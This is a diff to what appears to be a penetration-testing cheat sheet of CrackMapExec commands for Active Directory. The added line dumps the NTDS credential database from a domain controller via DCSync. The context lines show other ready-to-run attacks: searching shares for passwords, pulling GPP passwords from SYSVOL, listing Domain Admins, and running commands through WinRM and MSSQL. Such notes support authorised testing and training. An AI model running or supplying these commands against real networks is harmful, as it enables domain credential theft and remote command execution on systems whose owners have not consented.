@@ -114,6 +114,7 @@ Crackmapexec (https://www.youtube.com/watch?v=Dd4ZAm2mwwA)
     - cme smb DC_IP -u username -p 'password' --spider sharename --pattern pass --content (searches content for password)
   cme smb DC_IP -u username -p 'password' --groups 'Domain Admins' (displays all domain admins)
   cme smb DC_IP -u username -p 'password' -M gpp_password (searches DC SYSVOL for GPP passwords)
+  cme smb DC_IP -u username -p 'password'  --ntds (grabs the NTDS file from the DC using DCSync)
   cmd winrm 10.10.10.100-125 -u username -p 'password' (finds systems with WinRM enabled)
     - cmd winrm 10.10.10.100-125 -u username -p 'password' -x (-X powershell) whoami
   cme mssql SQL_IP -u username -p 'password' -x whoami (executes commands using MSSQL)
